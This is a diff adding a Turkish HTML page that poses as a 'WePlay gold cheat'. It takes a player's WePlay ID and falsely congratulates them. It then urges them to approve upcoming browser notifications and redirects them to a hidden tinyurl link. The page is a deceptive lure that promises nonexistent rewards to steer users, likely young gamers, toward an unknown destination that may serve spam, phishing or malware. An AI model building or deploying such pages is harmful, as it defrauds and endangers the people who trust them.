@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WePlay Altın Hilesi</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    background: linear-gradient(to bottom, #f4f4f4, #e0f7fa);
+    margin: 0;
+    padding: 20px;
+}
+
+h2 {
+    color: #00796b;
+    margin-bottom: 20px;
+}
+
+input {
+    padding: 15px;
+    width: 80%;
+    font-size: 18px;
+    border-radius: 8px;
+    border: 2px solid #00796b;
+    outline: none;
+    margin-bottom: 15px;
+}
+
+input:focus {
+    border-color: #004d40;
+    box-shadow: 0 0 5px #004d40;
+}
+
+button {
+    padding: 15px 30px;
+    font-size: 18px;
+    cursor: pointer;
+    background: #00796b;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    margin-top: 10px;
+}
+
+button:hover {
+    background: #004d40;
+}
+
+#message {
+    margin-top: 20px;
+    font-size: 16px;
+    color: #00796b;
+    min-height: 20px;
+}
+</style>
+</head>
+<body>
+
+<h2>WePlay Altın Hilesi 💰</h2>
+<input type="text" id="weplayID" placeholder="WePlay ID’nizi girin">
+<br>
+<button id="gosterBtn">Gönder</button>
+
+<div id="message"></div>
+
+<script>
+const gosterBtn = document.getElementById('gosterBtn');
+const weplayID = document.getElementById('weplayID');
+const msgBox = document.getElementById('message');
+
+if (gosterBtn && weplayID && msgBox) {
+    gosterBtn.addEventListener('click', () => {
+        try {
+            const id = weplayID.value.trim();
+            if (id === '') {
+                msgBox.style.color = 'red';
+                msgBox.textContent = 'Lütfen ID girin!';
+                return;
+            }
+
+            msgBox.style.color = 'green';
+            msgBox.textContent = `Tebrikler ${id}! Altın alabilirsin 💰`;
+
+            const altinBtn = document.createElement('button');
+            altinBtn.textContent = "Altını Al";
+            altinBtn.style.marginTop = "10px";
+            altinBtn.addEventListener('click', () => {
+                const onay = confirm("Karşınıza gelecek bildirimleri onaylarsanız altın alabilirsiniz.");
+                if (onay) {
+                    window.location.href = "https://tinyurl.com/24yu5bos";
+                } else {
+                    alert("Altın almak için bildirimi onaylamanız gerekiyor!");
+                }
+            });
+
+            msgBox.appendChild(document.createElement('br'));
+            msgBox.appendChild(altinBtn);
+        } catch (error) {
+            msgBox.style.color = 'red';
+            msgBox.textContent = 'Bir hata oluştu, lütfen tekrar deneyin.';
+        }
+    });
+} else {
+    console.error('Elementler bulunamadı: gosterBtn, weplayID veya message.');
+}
+</script>
+
+</body>
+</html>
